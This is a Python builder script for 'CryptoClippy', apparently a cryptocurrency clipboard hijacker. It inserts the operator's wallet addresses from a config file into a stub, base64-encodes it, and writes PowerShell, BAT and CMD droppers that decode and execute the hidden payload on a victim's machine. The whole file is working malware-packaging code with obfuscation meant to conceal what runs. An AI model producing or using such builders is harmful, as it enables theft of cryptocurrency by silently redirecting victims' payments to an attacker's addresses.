from src import *
import subprocess
import os
import shutil
import json
import re
import base64

shutil.rmtree('temp', ignore_errors=True)
os.mkdir('temp')

with open('src\\stub.py', 'r', encoding='utf-8') as f:
    stub = f.read()

with open('config.json', 'r', encoding='utf-8') as f:
    config = dict(json.load(f))

for coin, address in config.items():
    stub = re.sub(rf'\|{coin}\|?', f'{address}', stub)

with open('temp\\CryptoClippy.py', 'w', encoding='utf-8') as f:
    f.write(stub)

encoded = base64.b64encode(stub.encode('utf-8')).decode('ascii')

# PS1
ps1_content = f"""
$encoded = @"
{encoded}
"@
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
$scriptPath = "$env:TEMP\\CryptoClippy_run.py"
Set-Content -Path $scriptPath -Value $decoded -Encoding UTF8
python $scriptPath
"""

with open('temp\\CryptoClippy.ps1', 'w', encoding='utf-8') as f:
    f.write(ps1_content.strip())

# BAT/CMD
bat_content = f"""
@echo off
set "encoded={encoded}"
python -c "import base64; exec(base64.b64decode('{encoded}').decode('utf-8'))"
"""

for ext in ['.bat', '.cmd']:
    with open(f'temp\\CryptoClippy{ext}', 'w', encoding='utf-8') as f:
        f.write(bat_content.strip())

subprocess.run(['explorer', os.path.abspath('temp')])
